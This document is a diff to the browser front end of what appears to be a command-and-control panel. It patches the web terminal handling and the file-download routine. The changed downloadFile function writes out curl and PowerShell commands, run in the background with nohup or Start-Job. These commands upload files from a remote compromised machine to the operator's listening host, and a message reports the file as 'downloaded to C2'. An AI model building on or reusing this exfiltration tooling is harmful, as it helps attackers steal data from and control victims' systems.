@@ -56,6 +56,15 @@ Y88b.    888  888 Y88b.  Y88b 888 d88P 888  888 888 888 "88b
         container.appendChild(document.createElement("br"))
     }
 
+    term.attachCustomKeyEventHandler((ev) => {
+    if (ev.type === 'keydown' && ev.ctrlKey && ev.key === 'Enter') { // resend prompt on ctrl+enter
+        console.log("Ctrl+Enter pressed");
+        term.write('\r\n$ ');
+        return false; // prevent sending Enter to terminal
+    }
+        return true;
+    });
+
     term.onData(e => {
         switch (e) {
             case '\u0003': // Ctrl+C
@@ -67,18 +76,18 @@ Y88b.    888  888 Y88b.  Y88b 888 d88P 888  888 888 888 "88b
                     runCommand(term, '\x03');
                     command = '';
     
-                    terminal.write('\r\n$ ');
+                    term.write('\r\n$ ');
                 }
 
                 if (enableCTRLC == undefined) {
                     term.write('^C now works. Godspeed.')
-                    terminal.write('\r\n$ ');
+                    term.write('\r\n$ ');
                     enableCTRLC = true
                 }
 
                 if (enableCTRLC == false) {
                     term.write('^C does work. This may kill your session. Hit again to confirm.')
-                    terminal.write('\r\n$ ');
+                    term.write('\r\n$ ');
                     enableCTRLC = undefined
                 }
 
@@ -136,7 +145,7 @@ sio.on('clientrx', (msg) => {
             term.write(msg[uid])
         }
         
-        if ((msg[uid].slice(-1) == '1') && !keepTermQuiet) {
+        if ((msg[uid].slice(-1) == '1' || msg[uid].slice(-1) == '\u0003') && !keepTermQuiet) {
             term.write('\r\n$ ');
         }
     }
@@ -299,7 +308,7 @@ function downloadFile(directory, file) {
     var xhrDF = new XMLHttpRequest();
     xhrDF.open('POST', '/api/shell/run', true);
 
-    var cmd = "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"filename: {2}\" -H \"Authorization: {3}\" -T \"{0}\" \"http://{1}:{4}/\" && echo 1".formatUnicorn({0:pathJoin(directory, file), 1:hostIP, 2:file, 3:uid, 4:uploadPort})
+    var cmd = "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"filename: {2}\" -H \"Authorization: {3}\" -T \"{0}\" \"http://{1}:{4}/\"".formatUnicorn({0:pathJoin(directory, file), 1:hostIP, 2:file, 3:uid, 4:uploadPort})
 
     if (os == "Windows") {
         if (sht == "command prompt") {
@@ -308,10 +317,27 @@ function downloadFile(directory, file) {
             cmd = "Start-Job -ScriptBlock { Invoke-RestMethod -Uri 'http://{1}:{4}/' -Method Post -Headers @{ 'Content-Type' = 'multipart/form-data'; 'filename' = '{2}'; 'Authorization' = '{3}' } -InFile '{0}' }; echo 1".formatUnicorn({0:pathJoin(directory, file), 1:hostIP, 2:file, 3:uid, 4:uploadPort})
         }
     } else {
-        cmd = "nohup " + cmd + " & && echo 1"
+        cmd = "nohup " + cmd + " &"
     }
 
     console.log(cmd)
+
+    xhrDF.onload = function() {
+        if (xhrDF.responseText.includes("File uploaded successfully")) {
+            Toastify({
+                text: "<span style=\"font-family: roboto\">file {0} successfully downloaded to C2</span>".formatUnicorn({0: file}),
+                duration: 2.5 * 1000,
+                gravity: "top", // `top` or `bottom`
+                position: "right", // `left`, `center` or `right`
+                stopOnFocus: true, // Prevents dismissing of toast on hover
+                style: {
+                    background: "#058f00",
+                    boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(48,48,48,.3)",
+                },
+                escapeMarkup: false,
+            }).showToast()
+        }
+    }
 
     xhrDF.send(JSON.stringify({
         "uid": uid,
